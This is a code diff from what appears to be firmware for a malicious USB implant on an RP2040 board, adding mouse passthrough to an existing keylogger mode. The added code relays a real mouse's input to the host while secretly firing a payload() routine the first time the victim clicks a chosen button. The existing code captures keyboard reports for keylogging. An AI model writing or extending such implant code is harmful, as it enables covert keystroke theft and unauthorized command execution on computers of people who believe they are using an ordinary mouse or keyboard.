@@ -42,6 +42,10 @@ void setup() {
     TinyUSBDevice.setManufacturerDescriptor(manufacturer);
     TinyUSBDevice.setProductDescriptor(product); 
   }
+
+  if (USBHOST_MOUSE) {
+    Mouse.begin();
+  }
   
   Keyboard.begin();
   delay(1000);
@@ -119,7 +123,7 @@ void loop() {
 }
 
 void setup1() { 
-  if (KEYLOGGER) {
+  if (KEYLOGGER || USBHOST_MOUSE) {
     Serial.println("Core1 setup to run TinyUSB host with pio-usb");
 
     uint32_t cpu_hz = clock_get_hz(clk_sys);
@@ -136,13 +140,13 @@ void setup1() {
 }
 
 void loop1() {
-  if (KEYLOGGER) {
+  if (KEYLOGGER || USBHOST_MOUSE) {
     USBHost.task();    
   }
 }
 
 void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report, uint16_t desc_len) {
-  if (KEYLOGGER) {
+  if (KEYLOGGER || USBHOST_MOUSE) {
     if ( !tuh_hid_receive_report(dev_addr, idx) ) {
       Serial.printf("Error: cannot request to receive report\r\n");
     }  
@@ -150,19 +154,77 @@ void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report,
 }
 
 void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* report, uint16_t len) {
-  if (KEYLOGGER) {
     uint8_t const itf_protocol = tuh_hid_interface_protocol(dev_addr, idx);
 
-    switch (itf_protocol) {
-      case HID_ITF_PROTOCOL_KEYBOARD:
-        process_boot_kbd_report( (hid_keyboard_report_t const*) report );
-      break;
+    if (KEYLOGGER) {
+      switch (itf_protocol) {
+        case HID_ITF_PROTOCOL_KEYBOARD:
+          process_boot_kbd_report( (hid_keyboard_report_t const*) report );
+        break;
+      }
+
+      if ( !tuh_hid_receive_report(dev_addr, idx) ) {
+        Serial.printf("Error: cannot request to receive report\r\n");
+      }
     }
 
-    if ( !tuh_hid_receive_report(dev_addr, idx) ) {
-      Serial.printf("Error: cannot request to receive report\r\n");
+    if (USBHOST_MOUSE) {
+      switch (itf_protocol) {
+        case HID_ITF_PROTOCOL_MOUSE:
+          process_boot_mouse_report( (hid_mouse_report_t const*) report );
+        break;
+      }
+
+      if ( !tuh_hid_receive_report(dev_addr, idx) ) {
+        Serial.printf("Error: cannot request to receive report\r\n");
+      }
+    }
+}
+
+void process_boot_mouse_report(hid_mouse_report_t const * report) {
+  
+  hid_mouse_report_t prev_report = { 0 };
+
+  uint8_t button_changed_mask = report->buttons ^ prev_report.buttons;
+  if ( button_changed_mask & report->buttons) {
+    Serial.printf(" %c%c%c ", report->buttons & MOUSE_BUTTON_LEFT   ? 'L' : '-', report->buttons & MOUSE_BUTTON_MIDDLE ? 'M' : '-', report->buttons & MOUSE_BUTTON_RIGHT  ? 'R' : '-');
+
+    if(report->buttons & MOUSE_BUTTON_LEFT) {
+      Mouse.press(MOUSE_LEFT);
+      delay(100);
+      Mouse.release(MOUSE_ALL);
+
+      if (PAYLOAD_RUN_CLICK == "MOUSE_BUTTON_LEFT") {
+        payload();
+        PAYLOAD_RUN_CLICK = "NONE";
+      }
+    }
+
+    else if(report->buttons & MOUSE_BUTTON_RIGHT) {
+      Mouse.press(MOUSE_RIGHT); 
+      delay(100);
+      Mouse.release(MOUSE_ALL);
+
+      if (PAYLOAD_RUN_CLICK == "MOUSE_BUTTON_RIGHT") {
+        payload();
+        PAYLOAD_RUN_CLICK = "NONE";
+      }
+    }
+
+    else if(report->buttons & MOUSE_BUTTON_MIDDLE) {
+      Mouse.press(MOUSE_MIDDLE);
+      delay(100);
+      Mouse.release(MOUSE_ALL);
+
+      if (PAYLOAD_RUN_CLICK == "MOUSE_BUTTON_MIDDLE") {
+        payload();
+        PAYLOAD_RUN_CLICK = "NONE";
+      }
     }
   }
+  
+  int8_t x; int8_t y; int8_t wheel;
+  Mouse.move(report->x, report->y, report->wheel);
 }
 
 void SetModifiersArd(void) {
